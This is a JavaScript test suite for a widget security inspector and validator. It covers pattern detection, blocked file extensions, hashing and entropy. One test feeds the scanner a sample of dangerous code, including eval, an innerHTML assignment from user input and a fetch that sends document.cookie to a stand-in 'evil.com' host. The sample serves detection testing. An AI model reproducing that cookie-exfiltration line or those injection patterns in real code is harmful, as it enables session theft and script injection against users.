/**
 * Security Tools Test Suite v1.0.0
 * 
 * Tests for security-inspector.js and widget-validator.js
 * 
 * Path: C:\LLM-DevOSWE\SimWidget_Engine\tests\suites\security.test.js
 * Last Updated: 2025-01-08
 */

const path = require('path');
const fs = require('fs');

// Test definitions
const securityTests = [
    // Security Inspector Tests
    {
        id: 'security/inspector-loads',
        name: 'Security Inspector Loads',
        category: 'security',
        run: async () => {
            const SecurityInspector = require('../../tools/security-inspector');
            const inspector = new SecurityInspector();
            return {
                loaded: true,
                hasInspect: typeof inspector.inspect === 'function',
                hasScanJS: typeof inspector.scanJavaScript === 'function'
            };
        }
    },
    {
        id: 'security/scan-js-file',
        name: 'Scan JavaScript File',
        category: 'security',
        run: async () => {
            const SecurityInspector = require('../../tools/security-inspector');
            const inspector = new SecurityInspector();
            const testFile = path.join(__dirname, '../../templates/control-widget/widget.js');
            
            if (!fs.existsSync(testFile)) {
                return { error: 'Test file not found' };
            }
            
            const result = await inspector.inspectFile(testFile);
            return {
                scanned: true,
                hasHash: !!result.hash,
                hasIssues: Array.isArray(result.issues),
                issueCount: result.issues.length,
                fileType: result.type
            };
        }
    },
    {
        id: 'security/scan-directory',
        name: 'Scan Widget Directory',
        category: 'security',
        run: async () => {
            const SecurityInspector = require('../../tools/security-inspector');
            const inspector = new SecurityInspector();
            const testDir = path.join(__dirname, '../../templates/display-widget');
            
            if (!fs.existsSync(testDir)) {
                return { error: 'Test directory not found' };
            }
            
            const result = await inspector.inspect(testDir);
            return {
                scanned: true,
                isDirectory: !!result.directory,
                fileCount: result.files?.length || 0,
                hasSummary: !!result.summary
            };
        }
    },
    {
        id: 'security/detect-dangerous-patterns',
        name: 'Detect Dangerous Patterns',
        category: 'security',
        run: async () => {
            const SecurityInspector = require('../../tools/security-inspector');
            const inspector = new SecurityInspector();
            
            // Test dangerous code
            const dangerousCode = `
                eval("alert(1)");
                new Function("return this")();
                document.write("<script>bad</script>");
                element.innerHTML = userInput;
                fetch("https://evil.com/steal?data=" + document.cookie);
            `;
            
            inspector.results = { issues: [], metadata: {} };
            inspector.scanJavaScript(dangerousCode);
            
            const criticalCount = inspector.results.issues.filter(i => i.severity === 'critical').length;
            const highCount = inspector.results.issues.filter(i => i.severity === 'high').length;
            
            return {
                detected: true,
                criticalIssues: criticalCount,
                highIssues: highCount,
                totalIssues: inspector.results.issues.length,
                foundEval: inspector.results.issues.some(i => i.message.includes('eval')),
                foundInnerHTML: inspector.results.issues.some(i => i.message.includes('innerHTML')),
                foundFetch: inspector.results.issues.some(i => i.message.includes('fetch'))
            };
        }
    },

    // Widget Validator Tests
    {
        id: 'security/validator-loads',
        name: 'Widget Validator Loads',
        category: 'security',
        run: async () => {
            const WidgetValidator = require('../../tools/widget-validator');
            const validator = new WidgetValidator();
            return {
                loaded: true,
                hasValidate: typeof validator.validate === 'function',
                hasOptions: !!validator.options
            };
        }
    },
    {
        id: 'security/validate-template',
        name: 'Validate Widget Template',
        category: 'security',
        run: async () => {
            const WidgetValidator = require('../../tools/widget-validator');
            const validator = new WidgetValidator({ allowExternal: true });
            const testDir = path.join(__dirname, '../../templates/tool-widget');
            
            if (!fs.existsSync(testDir)) {
                return { error: 'Test directory not found' };
            }
            
            const result = await validator.validate(testDir);
            return {
                validated: true,
                hasStructure: !!result.structure,
                hasManifest: !!result.manifest,
                hasSecurity: !!result.security,
                errorCount: result.errors.length,
                warningCount: result.warnings.length,
                manifestValid: result.manifest?.valid || false
            };
        }
    },
    {
        id: 'security/validate-manifest-schema',
        name: 'Validate Manifest Schema',
        category: 'security',
        run: async () => {
            const WidgetValidator = require('../../tools/widget-validator');
            const validator = new WidgetValidator();
            
            // Test with control-widget which has a manifest
            const testDir = path.join(__dirname, '../../templates/control-widget');
            
            if (!fs.existsSync(testDir)) {
                return { error: 'Test directory not found' };
            }
            
            const result = await validator.validate(testDir);
            return {
                manifestExists: result.manifest?.exists || false,
                manifestValid: result.manifest?.valid || false,
                hasId: !!result.manifest?.data?.id,
                hasName: !!result.manifest?.data?.name,
                hasVersion: !!result.manifest?.data?.version,
                hasEntry: !!result.manifest?.data?.entry
            };
        }
    },
    {
        id: 'security/detect-blocked-files',
        name: 'Detect Blocked File Types',
        category: 'security',
        run: async () => {
            // Check that blocked patterns work
            const blockedPatterns = [
                /\.exe$/i,
                /\.dll$/i,
                /\.bat$/i,
                /\.ps1$/i
            ];
            
            const testFiles = ['malware.exe', 'hack.dll', 'script.bat', 'run.ps1', 'safe.js'];
            const blocked = testFiles.filter(f => blockedPatterns.some(p => p.test(f)));
            const safe = testFiles.filter(f => !blockedPatterns.some(p => p.test(f)));
            
            return {
                blockedCount: blocked.length,
                safeCount: safe.length,
                blockedFiles: blocked,
                safeFiles: safe,
                correctlyBlocked: blocked.length === 4 && safe.length === 1
            };
        }
    },

    // Hash Calculation Tests
    {
        id: 'security/hash-calculation',
        name: 'Hash Calculation',
        category: 'security',
        run: async () => {
            const crypto = require('crypto');
            const testContent = Buffer.from('SimWidget Test Content');
            
            const md5 = crypto.createHash('md5').update(testContent).digest('hex');
            const sha256 = crypto.createHash('sha256').update(testContent).digest('hex');
            
            return {
                md5Length: md5.length,
                sha256Length: sha256.length,
                md5Valid: md5.length === 32,
                sha256Valid: sha256.length === 64,
                md5Sample: md5.substring(0, 8)
            };
        }
    },

    // Entropy Calculation Test
    {
        id: 'security/entropy-calculation',
        name: 'Entropy Calculation',
        category: 'security',
        run: async () => {
            const SecurityInspector = require('../../tools/security-inspector');
            const inspector = new SecurityInspector();
            
            // Low entropy (repetitive)
            const lowEntropy = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
            const lowResult = inspector.calculateEntropy(lowEntropy);
            
            // High entropy (random-looking)
            const highEntropy = 'aB3$kL9@mN2#pQ5^rS8&tU1*vW4!xY7%';
            const highResult = inspector.calculateEntropy(highEntropy);
            
            return {
                lowEntropy: lowResult.toFixed(2),
                highEntropy: highResult.toFixed(2),
                lowIsLower: lowResult < highResult,
                highAboveThreshold: highResult > 4.0
            };
        }
    }
];

module.exports = securityTests;
